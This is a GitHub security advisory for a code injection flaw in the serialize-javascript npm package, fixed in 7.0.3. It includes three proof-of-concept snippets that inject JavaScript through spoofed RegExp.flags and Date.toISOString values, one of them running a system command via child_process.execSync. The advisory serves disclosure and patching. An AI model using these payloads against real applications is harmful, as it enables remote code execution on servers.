# [H] Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()

## Summary
Severity: High
Advisory: GHSA-5c6j-r48x-rmvq
CWE: CWE-96
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-28
Source: https://github.com/advisories/GHSA-5c6j-r48x-rmvq
Type: github-advisory

## Affected
- npm: `serialize-javascript` — affected >=0 <7.0.3

## Details
### Impact

The serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.

While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.

If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.

```javascript
const serialize = require('serialize-javascript');
// Create an object that passes instanceof RegExp with a spoofed .flags
const fakeRegex = Object.create(RegExp.prototype);
Object.defineProperty(fakeRegex, 'source', { get: () => 'x' });
Object.defineProperty(fakeRegex, 'flags', {
  get: () => '"+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"'
});
fakeRegex.toJSON = function() { return '@placeholder'; };
const output = serialize({ re: fakeRegex });
// Output: {"re":new RegExp("x", ""+(global.PWNED="CODE_INJECTION_VIA_FLAGS")+"")}
let obj;
eval('obj = ' + output);
console.log(global.PWNED); // "CODE_INJECTION_VIA_FLAGS" — injected code executed!
#h2. PoC 2: Code Injection via Date.toISOString()
```

```javascript
const serialize = require('serialize-javascript');
const fakeDate = Object.create(Date.prototype);
fakeDate.toISOString = function() { return '"+(global.DATE_PWNED="DATE_INJECTION")+"'; };
fakeDate.toJSON = function() { return '2024-01-01'; };
const output = serialize({ d: fakeDate });
// Output: {"d":new Date(""+(global.DATE_PWNED="DATE_INJECTION")+"")}
eval('obj = ' + output);
console.log(global.DATE_PWNED); // "DATE_INJECTION" — injected code executed!
#h2. PoC 3: Remote Code Execution
```

```javascript
const serialize = require('serialize-javascript');
const rceRegex = Object.create(RegExp.prototype);
Object.defineProperty(rceRegex, 'source', { get: () => 'x' });
Object.defineProperty(rceRegex, 'flags', {
  get: () => '"+require("child_process").execSync("id").toString()+"'
});
rceRegex.toJSON = function() { return '@rce'; };
const output = serialize({ re: rceRegex });
// Output: {"re":new RegExp("x", ""+require("child_process").execSync("id").toString()+"")}
// When eval'd on a Node.js server, executes the "id" system command
```

### Patches

The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3

## References
- https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-5c6j-r48x-rmvq
- https://nvd.nist.gov/vuln/detail/CVE-2020-7660
- https://github.com/yahoo/serialize-javascript/commit/2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9
- https://github.com/advisories/GHSA-hxcc-f52p-wc94
- https://github.com/yahoo/serialize-javascript
- https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3
